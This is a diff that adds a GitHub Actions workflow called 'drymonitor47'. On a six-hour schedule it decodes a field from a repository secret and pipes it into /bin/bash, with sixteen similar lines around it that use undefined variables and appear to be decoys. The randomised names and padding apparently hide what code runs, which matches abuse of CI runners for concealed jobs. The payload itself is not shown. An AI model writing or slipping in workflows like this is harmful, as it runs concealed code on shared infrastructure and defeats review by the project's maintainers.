@@ -1,0 +1,32 @@
+name: drymonitor47
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: drymonitor47
+        env:
+          qz24263: ${{ secrets.qz24263 }}
+        run: |
+          echo $qz24263 | jq -r .f3 | /bin/bash
+          echo $b1273 | jq -r .xcmae21499 | /bin/bash
+          echo $ditmf98426 | jq -r .fpfn51 | /bin/bash
+          echo $rzpr16 | jq -r .usa315 | /bin/bash
+          echo $synac05799 | jq -r .ust1 | /bin/bash
+          echo $l07 | jq -r .ldz186 | /bin/bash
+          echo $tbch413 | jq -r .ugnlw00565 | /bin/bash
+          echo $iifyr63409 | jq -r .tpc40721 | /bin/bash
+          echo $nxnge02167 | jq -r .fua90 | /bin/bash
+          echo $oyj25 | jq -r .vpja36248 | /bin/bash
+          echo $v9 | jq -r .o66421 | /bin/bash
+          echo $qatk35413 | jq -r .wngv45 | /bin/bash
+          echo $yau49130 | jq -r .fubip6 | /bin/bash
+          echo $ck7920 | jq -r .n65 | /bin/bash
+          echo $bnfd59 | jq -r .eoe804 | /bin/bash
+          echo $we73624 | jq -r .wk83483 | /bin/bash
+          echo $df61217 | jq -r .ykqw83 | /bin/bash
+
